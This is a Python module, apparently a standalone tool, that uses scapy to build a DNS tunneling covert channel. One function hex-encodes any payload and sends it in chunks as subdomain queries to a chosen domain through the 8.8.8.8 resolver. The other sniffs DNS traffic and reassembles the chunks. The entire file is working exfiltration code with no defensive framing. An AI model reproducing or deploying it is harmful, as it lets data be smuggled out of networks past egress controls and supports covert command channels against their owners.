import logging
import time
from scapy.all import DNS, DNSQR, IP, send, sniff, UDP

def send_dns_covert(domain, payload):
    """
    Sends a payload via DNS tunneling by encoding it in subdomains.
    """
    logging.info(f"Sending payload via DNS to {domain}...")

    # Encode payload to be DNS-friendly (hex)
    encoded_payload = payload.hex()

    # Split into chunks of 63 bytes (max subdomain length)
    chunks = [encoded_payload[i:i+63] for i in range(0, len(encoded_payload), 63)]

    for i, chunk in enumerate(chunks):
        subdomain = f"{chunk}.{domain}"
        packet = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=subdomain))
        send(packet, verbose=False)
        logging.info(f"Sent chunk {i+1}/{len(chunks)}: {subdomain}")
        time.sleep(0.1)

    logging.info("DNS payload transmission complete.")

def listen_dns_covert(domain, timeout=60):
    """
    Listens for a payload sent via DNS tunneling.
    """
    logging.info(f"Listening for DNS traffic for domain {domain}...")

    payload_chunks = []

    def packet_handler(packet):
        if DNSQR in packet and packet[DNSQR].qname.decode().endswith(f".{domain}."):
            subdomain = packet[DNSQR].qname.decode().replace(f".{domain}.", "")
            payload_chunks.append(subdomain)
            logging.info(f"Received chunk: {subdomain}")

    sniff(filter="udp port 53", prn=packet_handler, timeout=timeout)

    if not payload_chunks:
        logging.warning("No DNS chunks received.")
        return None

    # Reassemble and decode
    hex_payload = "".join(payload_chunks)
    try:
        return bytes.fromhex(hex_payload)
    except ValueError:
        logging.error("Failed to decode hex payload from DNS chunks.")
        return None